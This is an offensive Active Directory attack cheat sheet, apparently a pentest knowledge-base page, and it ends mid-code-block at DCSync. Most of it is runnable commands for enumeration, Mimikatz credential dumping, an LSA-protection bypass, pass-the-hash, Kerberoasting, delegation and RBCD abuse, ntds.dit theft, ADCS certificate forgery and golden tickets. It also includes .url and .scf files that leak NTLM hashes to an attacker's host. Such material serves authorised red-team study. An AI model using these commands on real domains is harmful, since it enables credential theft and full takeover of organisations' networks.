---
title: "Active Directory Attack Methodology"
description: "End-to-end AD exploitation: enum, roasting, delegation, lateral movement, DCSync, persistence."
category: active-directory
tags: [active-directory, methodology, kerberos, lateral-movement]
tools: [Impacket, Rubeus, Mimikatz, CrackMapExec]
difficulty: advanced
updated: "2026-08-09"
source: "vault:ActiveDirectory/Active-Directory_cheat_sheet.md"
---

# Active Directory Attack Methodology

Common enumeration and attack methods for Windows Active Directory, from domain recon through domain and cross-forest persistence. Inspired by the PayloadsAllTheThings repo.

## Tools

- Powersploit — https://github.com/PowerShellMafia/PowerSploit/tree/dev
- PowerUpSQL — https://github.com/NetSPI/PowerUpSQL
- Powermad — https://github.com/Kevin-Robertson/Powermad
- Impacket — https://github.com/fortra/impacket
- Mimikatz — https://github.com/gentilkiwi/mimikatz
- Rubeus — https://github.com/GhostPack/Rubeus (compiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- BloodHound — https://github.com/SpecterOps/BloodHound
- AD Module — https://github.com/samratashok/ADModule
- Adalanche — https://github.com/lkarlslund/adalanche

> **Note —** CrackMapExec is now deprecated in favour of NetExec (`nxc`, https://github.com/Pennyw0rth/NetExec). Where this sheet shows `crackmapexec`/`cme`, use `nxc` with the same syntax.

## Domain Enumeration

### Using PowerView

PowerView v3.0 — https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

- **Get Current Domain:** `Get-Domain`
- **Enumerate Other Domains:** `Get-Domain -Domain <DomainName>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Policy:**

  ```powershell
  Get-DomainPolicy

  # Show policy configurations of the domain (system access or kerberos)
  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
  ```

- **Get Domain Controllers:**

  ```powershell
  Get-DomainController
  Get-DomainController -Domain <DomainName>
  ```

- **Enumerate Domain Users:**

  ```powershell
  # Save all Domain Users to a file
  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

  # Return specific properties of a specific user
  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

  # Enumerate user logged on a machine
  Get-NetLoggedon -ComputerName <ComputerName>

  # Enumerate Session Information for a machine
  Get-NetSession -ComputerName <ComputerName>

  # Enumerate domain machines where specific users are logged in
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
  ```

- **Enum Domain Computers:**

  ```powershell
  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

  # Enumerate live machines
  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
  ```

- **Enum Groups and Group Members:**

  ```powershell
  # Save all Domain Groups to a file
  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

  # Return members of a specific group (e.g. Domain Admins & Enterprise Admins)
  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

  # Enumerate local groups on the local (or remote) machine (needs local admin on remote)
  Get-NetLocalGroup | Select-Object GroupName

  # Enumerate members of a specific local group (needs local admin on remote)
  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

  # GPOs that modify local group memberships via Restricted Groups or GPP
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```

- **Enumerate Shares:**

  ```powershell
  # Enumerate Domain Shares
  Find-DomainShare

  # Enumerate Domain Shares the current user has access to
  Find-DomainShare -CheckShareAccess

  # Enumerate "interesting" files on accessible shares
  Find-InterestingDomainShareFile -Include *passwords*
  ```

- **Enum Group Policies:**

  ```powershell
  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

  # Enumerate all GPOs applied to a specific computer
  Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

  # Get users that are part of a machine's local Admin group
  Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
  ```

- **Enum OUs:**

  ```powershell
  Get-DomainOU -Properties Name | Sort-Object -Property Name
  ```

- **Enum ACLs:**

  ```powershell
  # Returns the ACLs associated with the specified account
  Get-DomainObjectAcl -Identity <AccountName> -ResolveGUIDs

  # Search for interesting ACEs
  Find-InterestingDomainAcl -ResolveGUIDs

  # Check the ACLs associated with a specified path (e.g. SMB share)
  Get-PathAcl -Path "\\Path\Of\A\Share"
  ```

- **Enum Domain Trust:**

  ```powershell
  Get-DomainTrust
  Get-DomainTrust -Domain <DomainName>

  # Enumerate all trusts for the current domain and each domain it finds
  Get-DomainTrustMapping
  ```

- **Enum Forest Trust:**

  ```powershell
  Get-ForestDomain
  Get-ForestDomain -Forest <ForestName>

  # Map the trust of the forest
  Get-ForestTrust
  Get-ForestTrust -Forest <ForestName>
  ```

- **User Hunting:**

  ```powershell
  # Find all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  # Find local admins on all machines of the domain
  Find-DomainLocalGroupMember -Verbose

  # Find computers where a Domain Admin OR a specified user has a session
  Find-DomainUserLocation | Select-Object UserName, SessionFromName

  # Confirming admin access
  Test-AdminAccess
  ```

  > **Priv Esc to Domain Admin with User Hunting —** I have local admin access on a machine → a Domain Admin has a session on that machine → I steal his token and impersonate him → profit.

### Using AD Module

- **Get Current Domain:** `Get-ADDomain`
- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Controllers:**

  ```powershell
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
  ```

- **Enumerate Domain Users:**

  ```powershell
  Get-ADUser -Filter * -Identity <user> -Properties *

  # Get a specific "string" on a user's attribute
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
  ```

- **Enum Domain Computers:**

  ```powershell
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter *
  ```

- **Enum Domain Trust:**

  ```powershell
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <DomainName>
  ```

- **Enum Forest Trust:**

  ```powershell
  Get-ADForest
  Get-ADForest -Identity <ForestName>

  # Domains of forest enumeration
  (Get-ADForest).Domains
  ```

- **Enum Local AppLocker Effective Policy:**

  ```powershell
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  ```

### Using BloodHound

#### Remote BloodHound

Python BloodHound — https://github.com/dirkjanm/BloodHound.py or `pip3 install bloodhound`

```bash
bloodhound-python -u <UserName> -p <Password> -ns <DC IP> -d <Domain> -c All
```

#### On-Site BloodHound

```powershell
# Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <DC IP> --OutputDirectory <PathToFile>

# Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -LdapUsername <UserName> -LdapPassword <Password> -OutputDirectory <PathToFile>
```

### Using Adalanche

```bash
# Kali Linux
./adalanche collect activedirectory --domain <Domain> \
  --username <Username@Domain> --password <Password> \
  --server <DC>

# Example
./adalanche collect activedirectory --domain windcorp.local \
  --username spoNge369@windcorp.local --password 'password123!' \
  --server dc.windcorp.htb

# LDAP Result Code 200 "Network Error": x509 certificate signed by unknown authority?
./adalanche collect activedirectory --domain windcorp.local \
  --username spoNge369@windcorp.local --password 'password123!' \
  --server dc.windcorp.htb --tlsmode NoTLS --port 389

# Invalid Credentials?
./adalanche collect activedirectory --domain windcorp.local \
  --username spoNge369@windcorp.local --password 'password123!' \
  --server dc.windcorp.htb --tlsmode NoTLS --port 389 \
  --authmode basic

# Analyze data — browse to http://127.0.0.1:8080
./adalanche analyze
```

#### Export Enumerated Objects

Export objects from any cmdlet into XML for later analysis. `Export-Clixml` serialises objects to a CLI XML file; `Import-Clixml` recreates them.

```powershell
# Export Domain users to xml file
Get-DomainUser | Export-CliXml .\DomainUsers.xml

# Later, re-import for analysis on any machine
$DomainUsers = Import-CliXml .\DomainUsers.xml

# Apply any condition, filters, etc.
$DomainUsers | select name
$DomainUsers | ? {$_.name -match "User's Name"}
```

### Useful Enumeration Tools

- ldapdomaindump — LDAP information dumper
- adidnsdump — integrated DNS dumping by any authenticated user
- ACLight — advanced discovery of privileged accounts
- ADRecon — detailed Active Directory recon tool

## Local Privilege Escalation

- Windows Local Privilege Escalation Cookbook — https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook
- Juicy Potato — abuse SeImpersonate/SeAssignPrimaryToken for SYSTEM impersonation (works only up to Windows Server 2016 and Windows 10 patch 1803)
- Lovely Potato — automated Juicy Potato (same version limits)
- PrintSpoofer — exploit the PrinterBug for SYSTEM impersonation (works on Windows Server 2019 and Windows 10)
- RoguePotato — upgraded Juicy Potato (works on Windows Server 2019 and Windows 10)
- Abusing Token Privileges — foxglovesecurity writeup
- SMBGhost CVE-2020-0796 — PoC: https://github.com/danigargu/CVE-2020-0796
- CVE-2021-36934 (HiveNightmare/SeriousSAM) — https://github.com/cube0x0/CVE-2021-36934

### Useful Local Priv Esc Tools

- PowerUp — misconfiguration abuse
- BeRoot — general priv esc enumeration
- Privesc — general priv esc enumeration
- FullPowers — restore a service account's privileges

## Lateral Movement

### PowerShell Remoting

```powershell
# Enable PowerShell Remoting on current machine (needs admin)
Enable-PSRemoting

# Enter or start a new PSSession (needs admin)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name>   # OR -Session <SessionName>
```

### Remote Code Execution with PS Credentials

```powershell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

### Import a PowerShell Module and Execute its Functions Remotely

```powershell
# Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess

# Interact with the session
Enter-PSSession -Session $sess
```

### Executing Remote Stateful Commands

```powershell
# Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

# Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

# Check the result to confirm an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

### Mimikatz

```powershell
# Commands are in Cobalt Strike format

# Dump LSASS
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

# (Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

# List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

# Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

# Dump and save LSASS to a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

# List cached MasterKeys
mimikatz sekurlsa::dpapi

# List local Kerberos AES keys
mimikatz sekurlsa::ekeys

# Dump SAM database
mimikatz lsadump::sam

# Dump SECRETS database
mimikatz lsadump::secrets

# Inject and dump the DC's credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

# Dump the domain's credentials without touching DC's LSASS, remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

# Dump old passwords and NTLM hashes of a user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

# List and dump local kerberos credentials
mimikatz kerberos::list /dump

# Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

# List TS/RDP sessions
mimikatz ts::sessions

# List Vault credentials
mimikatz vault::list
```

**What if Mimikatz fails to dump credentials because of LSA Protection?**

- LSA as a Protected Process (kernel-land bypass):

  ```powershell
  # Check if LSA runs as a protected process (RunAsPPL == 0x1)
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

  # Upload mimidriver.sys from the mimikatz repo to the same folder as mimikatz.exe
  # Import the driver
  mimikatz # !+

  # Remove the protection flags from lsass.exe
  mimikatz # !processprotect /process:lsass.exe /remove

  # Run logonpasswords to dump lsass
  mimikatz # sekurlsa::logonpasswords
  ```

- LSA as a Protected Process (userland "fileless" bypass): PPLdump, "Bypassing LSA Protection in Userland" (scrt.ch).
- LSA running as a virtualised process (LSAISO) via Credential Guard:

  ```powershell
  # Check for lsaiso.exe in running processes
  tasklist | findstr lsaiso

  # If present, LSASS dumps only yield encrypted data. Inject a malicious SSP into memory
  mimikatz # misc::memssp

  # Every session/auth now logs plaintext creds to c:\windows\system32\mimilsa.log
  ```

### Remote Desktop Protocol

If the target host has "RestrictedAdmin" enabled, pass the hash over RDP for an interactive session without the plaintext password.

- Mimikatz:

  ```powershell
  # Pass-the-hash and spawn mstsc.exe with /restrictedadmin
  privilege::debug
  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
  # Then click OK on the RDP dialogue for an interactive session as the impersonated user
  ```

- xFreeRDP:

  ```bash
  xfreerdp +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:<Username> /pth:<NTLMHash> /v:<Hostname|IPAddress>
  ```

If Restricted Admin mode is disabled on the remote machine, connect via psexec/winrm and enable it by setting `HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin` to zero.

- Bypass "Single Session per User" restriction — with SYSTEM/local admin, hijack an in-use RDP session by adding this registry key:

  ```powershell
  REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
  ```

  Delete it afterwards to restore the restriction:

  ```powershell
  REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser
  ```

### URL File Attacks

- `.url` file:

  ```ini
  [InternetShortcut]
  URL=whatever
  WorkingDirectory=whatever
  IconFile=\\<AttackersIp>\%USERNAME%.icon
  IconIndex=1
  ```

  ```ini
  [InternetShortcut]
  URL=file://<AttackersIp>/leak/leak.html
  ```

- `.scf` file:

  ```ini
  [Shell]
  Command=2
  IconFile=\\<AttackersIp>\Share\test.ico
  [Taskbar]
  Command=ToggleDesktop
  ```

Drop these in a writeable share; the victim only has to browse to it in Explorer (no interaction/open needed, but the file must be visible/top of the listing to render). Use Responder to capture the hashes.

> **Note —** `.scf` file attacks won't work on the latest versions of Windows.

### Useful Tools

- Powercat — netcat in PowerShell (tunneling, relay, port-forward)
- SCShell — fileless lateral movement via ChangeServiceConfigA
- Evil-WinRM — WinRM shell for hacking/pentesting
- RunasCs — open C# version of Windows `runas.exe`
- ntlm_theft — creates all file formats for URL-file attacks

## Domain Privilege Escalation

### Kerberoast

Any standard domain user can request a TGS for any SPN bound to a user account, extract the encrypted blob (encrypted with the account's password), and brute-force it offline.

- PowerView:

  ```powershell
  # Get user accounts used as service accounts
  Get-NetUser -SPN

  # Get every SPN account, request a TGS and dump its hash
  Invoke-Kerberoast

  # Request the TGS for a single account
  Request-SPNTicket

  # Export all tickets using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::list /export"'
  ```

- AD Module:

  ```powershell
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```

- Impacket:

  ```bash
  impacket-GetUserSPNs <DomainName>/<DomainUser>:<Password> -request -outputfile <FileName>
  ```

- Rubeus:

  ```powershell
  # Kerberoast and output to a file in a specific format
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

  # OPSEC-safe: don't roast AES-enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

  # Roast AES-enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

  # Roast a specific user
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

  # Roast by specifying authentication credentials
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
  ```

Crack with hashcat mode 13100 (RC4 TGS), or 19600/19700 for AES-128/AES-256 tickets.

### ASREPRoast

If a domain user account does not require Kerberos pre-authentication, you can request a valid AS-REP without domain credentials, extract the encrypted blob, and brute-force it offline.

- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Forcefully disable Kerberos pre-auth on an account you have write permissions over. Add a filter (e.g. RDPUsers) to target user accounts, not machine accounts — machine account hashes are not crackable.

PowerView:

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

# Disable Kerberos Preauth
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose

# Check if the value changed
Get-DomainUser -PreauthNotRequired -Verbose
```

- Using the ASREPRoast tool:

  ```powershell
  # Get a specific account's hash
  Get-ASREPHash -UserName <UserName> -Verbose

  # Get any ASREPRoastable users' hashes
  Invoke-ASREPRoast -Verbose
  ```

- Using Rubeus:

  ```powershell
  # All domain users
  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  # Specific user
  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  # Users of a specific OU
  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

- Using Impacket:

  ```bash
  impacket-GetNPUsers <domain_name>/ -usersfile <users_file> -outputfile <FileName>
  ```

Crack AS-REP hashes with hashcat mode 18200.

### Password Spray Attack

If you harvest passwords by compromising an account, exploit password reuse across other domain accounts.

**Tools:**

- DomainPasswordSpray
- NetExec (`nxc smb <target> -u users.txt -p 'Password!' --continue-on-success`) — successor to CrackMapExec
- Invoke-CleverSpray
- Spray

### Force Set SPN

With GenericAll/GenericWrite over a target account, set an SPN on it, request a TGS, grab the blob, and brute-force it.

- PowerView:

  ```powershell
  # Check for interesting permissions on accounts
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

  # Check if the target already has an SPN set
  Get-DomainUser -Identity <UserName> | select serviceprincipalname

  # Force set the SPN on the account
  Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  ```

- AD Module:

  ```powershell
  # Check if the target already has an SPN set
  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName

  # Force set the SPN on the account
  Set-ADUser -Identity <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
  ```

Then use any tool above to grab and kerberoast the hash.

### Abusing Shadow Copies

With local administrator access, list shadow copies — an easy route to domain escalation.

```powershell
# List shadow copies using vssadmin (needs admin)
vssadmin list shadows

# List shadow copies using diskshadow
diskshadow list shadows all

# Symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1. Dump the backed-up SAM database and harvest credentials.
2. Look for DPAPI-stored creds and decrypt them.
3. Access backed-up sensitive files.

### List and Decrypt Stored Credentials using Mimikatz

Encrypted credentials are usually stored in `%appdata%\Microsoft\Credentials` and `%localappdata%\Microsoft\Credentials`.

```powershell
# Enumerate the cred object and get information about it
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

# Note the guidMasterKey parameter (which masterkey encrypted the credential), then enumerate it
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

# In the context of the owning user (or system), use /rpc to offload masterkey decryption to the DC
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

# The masterkey is now in local cache
dpapi::cache

# Decrypt the credential using the cached masterkey
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```

### Unconstrained Delegation

With administrative access to a machine that has Unconstrained Delegation enabled, wait for a high-value target/DA to connect, steal their TGT, then PTT and impersonate them.

Using PowerView:

```powershell
# Discover domain-joined computers with Unconstrained Delegation
Get-NetComputer -UnConstrained

# List tickets; check if a DA/high-value target stored its TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

# Monitor incoming sessions on our compromised server
Invoke-UserHunter -ComputerName <NameOfTheComputer> -Poll <TimeInSeconds> -UserName <UserToMonitorFor> -Delay <WaitInterval> -Verbose

# Dump the tickets to disk
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Impersonate via PTT
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTicket>"'
```

Rubeus works here too (see the printer-bug / SpoolSample technique below).

### Constrained Delegation

Using PowerView and Kekeo:

```powershell
# Enumerate users and computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Ask for a valid TGT of a constrained-delegation user (kekeo)
tgt::ask /user:<UserName> /domain:<Domain FQDN> /rc4:<hashedPasswordOfTheUser>

# Ask for a TGS to a service the user can access via constrained delegation
tgs::s4u /tgt:<PathToTGT> /user:<UserToImpersonate>@<Domain FQDN> /service:<Service SPN>

# PTT the TGS
Invoke-Mimikatz -Command '"kerberos::ptt <PathToTGS>"'
```

Alternative — Rubeus:

```powershell
Rubeus.exe s4u /user:<UserName> /rc4:<NTLMhashedPasswordOfTheUser> /impersonateuser:<UserToImpersonate> /msdsspn:"<Service SPN>" /altservice:<Optional> /ptt
```

> **Delegation rights for only a specific SPN (e.g. TIME)?** Abuse Kerberos "alternative service": request TGS for other services the host supports, giving full access to the target machine.

### Resource-Based Constrained Delegation

With GenericAll/GenericWrite on a machine account object, impersonate any domain user (e.g. Domain Administrator) to that machine.

First enter the security context of the user/machine account with the privileges (PTH, RDP, PSCredentials, etc.).

```powershell
# Import Powermad and create a new MACHINE ACCOUNT
. .\Powermad.ps1
New-MachineAccount -MachineAccount <MachineAccountName> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

# Import PowerView and get the SID of the new machine account
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <MachineAccountName> -Properties objectsid | Select -Expand objectsid

# Build an ACE for the new machine account using a raw security descriptor
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Set the security descriptor in msDS-AllowedToActOnBehalfOfOtherIdentity on the target computer
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose

# Get the RC4 hash of the new machine account's password
Rubeus.exe hash /password:'p@ssword!'

# Impersonate Domain Administrator for CIFS on the target
Rubeus.exe s4u /user:<MachineAccountName> /rc4:<RC4HashOfMachineAccountPassword> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

# Access the C$ drive of the target machine
dir \\TargetMachine.wtver.domain\C$
```

> **Note —** In constrained / RBCD scenarios, if you lack the password/hash of the account with `TRUSTED_TO_AUTH_FOR_DELEGATION`, use `tgt::deleg` (kekeo) or `tgtdeleg` (Rubeus) to trick Kerberos into a valid TGT for that account, then use the ticket instead of the hash.

```powershell
Rubeus.exe tgtdeleg /nowrap
```

### DNSAdmins Abuse

A member of the DNSAdmins group can load an arbitrary DLL with the privileges of dns.exe (running as SYSTEM). If the DC serves DNS, this escalates to DA. Requires privileges to restart the DNS service.

1. Enumerate DNSAdmins members:
   - PowerView: `Get-NetGroupMember -GroupName "DNSAdmins"`
   - AD Module: `Get-ADGroupMember -Identity DNSAdmins`
2. Compromise a member.
3. Serve a malicious DLL and configure its usage:

   ```powershell
   # Using dnscmd
   dnscmd <NameOfDNSMachine> /config /serverlevelplugindll \\Path\To\Our\Dll\malicious.dll

   # Restart the DNS service
   sc \\DNSServer stop dns
   sc \\DNSServer start dns
   ```

### Abusing Active Directory-Integrated DNS

- "Exploiting Active Directory-Integrated DNS" (NetSPI)
- "ADIDNS Revisited" (NetSPI)
- Inveigh — https://github.com/Kevin-Robertson/Inveigh

### Abusing Backup Operators Group

Compromising a Backup Operators member lets you abuse SeBackupPrivilege to shadow-copy the DC, extract `ntds.dit`, dump hashes, and escalate to DA.

1. Create a shadow copy using the signed `diskshadow` binary:

   ```text
   # script.txt
   set context persistent nowriters
   set metadata c:\windows\system32\spool\drivers\color\example.cab
   set verbose on
   begin backup
   add volume c: alias mydrive
   create
   expose %mydrive% w:
   end backup
   ```

   ```powershell
   # Execute diskshadow with the script
   diskshadow /s script.txt
   ```

2. Copy `ntds.dit` using Win32 backup API calls (SeBackupPrivilege repo by giuliano108):

   ```powershell
   # Import both DLLs from the repo
   Import-Module .\SeBackupPrivilegeCmdLets.dll
   Import-Module .\SeBackupPrivilegeUtils.dll

   # Check / enable SeBackupPrivilege
   Get-SeBackupPrivilege
   Set-SeBackupPrivilege

   # Copy ntds.dit from the shadow copy
   Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\<PathToSave>\ntds.dit -Overwrite

   # Dump the SYSTEM hive
   reg save HKLM\SYSTEM c:\temp\system.hive
   ```

3. Copy `ntds.dit` and the SYSTEM hive to your machine (`impacket-smbclient` or similar).
4. Dump hashes with `impacket-secretsdump`.
5. PTH with psexec (or similar) for Domain Admin access.

### Abusing Exchange

- "Abusing Exchange: One API Call Away From Domain Admin" (dirkjanm)
- CVE-2020-0688
- PrivExchange — https://github.com/dirkjanm/PrivExchange

### Weaponizing Printer Bug

- "Printer Server Bug to Domain Administrator" (Dionach)
- NetNTLMtoSilverTicket — https://github.com/NotMedic/NetNTLMtoSilverTicket

### Abusing ACLs

- "Escalating privileges with ACLs in Active Directory" (fox-it)
- aclpwn.py — https://github.com/fox-it/aclpwn.py
- Invoke-ACLPwn — https://github.com/fox-it/Invoke-ACLPwn

### Abusing IPv6 with mitm6

- "mitm6 — Compromising IPv4 networks via IPv6" (fox-it)
- mitm6 — https://github.com/dirkjanm/mitm6

### SID History Abuse

If you compromise a child domain of a forest and SID filtering is not enabled (often the case), abuse the SID History field on a Kerberos TGT to escalate to Domain Administrator of the forest root.

```powershell
# Get the SID of the current domain (PowerView)
Get-DomainSID -Domain current.root.domain.local

# Get the SID of the root domain (PowerView)
Get-DomainSID -Domain root.domain.local

# Enterprise Admins SID format: RootDomainSID-519

# Forge an "extra" golden ticket (mimikatz)
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi

# Inject the ticket
kerberos::ptt \path\to\ticket\golden.kirbi

# List the DC of the root domain
dir \\dc.root.domain.local\C$

# Or DCSync and dump the hashes
lsadump::dcsync /domain:root.domain.local /all
```

### Exploiting SharePoint

- CVE-2019-0604 — RCE (PoC: https://github.com/k8gege/CVE-2019-0604)
- CVE-2019-1257 — code execution via BDC deserialization
- CVE-2020-0932 — RCE using typeconverters (PoC: thezdi/PoC)

### Zerologon

- Zerologon whitepaper (Secura) — unauthenticated domain controller compromise
- SharpZeroLogon — C# implementation
- Invoke-ZeroLogon — PowerShell implementation
- zer0dump — Python (Impacket) implementation

### PrintNightmare

- CVE-2021-34527 — vulnerability details
- Impacket implementation — https://github.com/cube0x0/CVE-2021-1675
- SharpPrintNightmare — C# implementation

### Active Directory Certificate Services

Check for vulnerable certificate templates with Certify (can run via Cobalt Strike `execute-assembly`):

```powershell
.\Certify.exe find /vulnerable /quiet
```

Confirm `msPKI-Certificate-Name-Flag` is `ENROLLEE_SUPPLIES_SUBJECT`, enrollment rights allow Domain/Authenticated Users, `pkiextendedkeyusage` includes Client Authentication, and "Authorized Signatures Required" is 0. These enable an attacker to specify a Domain Admin UPN and forge authentication with the captured certificate. (If the DA is in Protected Users, the exploit may not work — check first.)

Request the DA's account certificate with Certify:

```powershell
.\Certify.exe request /template:<Template Name> /quiet /ca:"<CA Name>" /domain:<domain.com> /path:CN=Configuration,DC=<domain>,DC=com /altname:<Domain Admin AltName> /machine
```

Consolidate the exported `cert.pem` and `cert.key` into a single `cert.pem`, with one blank line between `END RSA PRIVATE KEY` and `BEGIN CERTIFICATE`:

```text
-----BEGIN RSA PRIVATE KEY-----
BIIEogIBAAk15x0ID[...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
BIIEogIBOmgAwIbSe[...]
-----END CERTIFICATE-----
```

Convert to PKCS#12 with OpenSSL (export password can be anything):

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Upload `cert.pfx` to the compromised host, then use Rubeus to request a TGT for the DA account and import it into memory:

```powershell
.\Rubeus.exe asktgt /user:<Domain Admin AltName> /domain:<domain.com> /dc:<Domain Controller IP or Hostname> /certificate:<Local Machine Path to cert.pfx> /nowrap /ptt
```

This enables activities under the DA context, such as a DCSync. (See also the modern Certipy-based ADCS/ESC workflow.)

### No PAC (CVE-2021-42278 / CVE-2021-42287)

- sAMAccountName spoofing — thehacker.recipes
- Weaponisation writeup — exploit.ph
- noPac — https://github.com/cube0x0/noPac
- sam-the-admin — Python automation
- noPac (Ridter) — evolution of sam-the-admin

## Domain Persistence

### Golden Ticket Attack

```powershell
# Grab the krbtgt hash on the DC as DA
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <DC'sName>

# On any machine
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain SID> /krbtgt:<HashOfkrbtgtAccount> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

### DCSync Attack

```powershell
# DCSync via mimikatz (needs DA or DS-Replication-Get-Changes[-All])
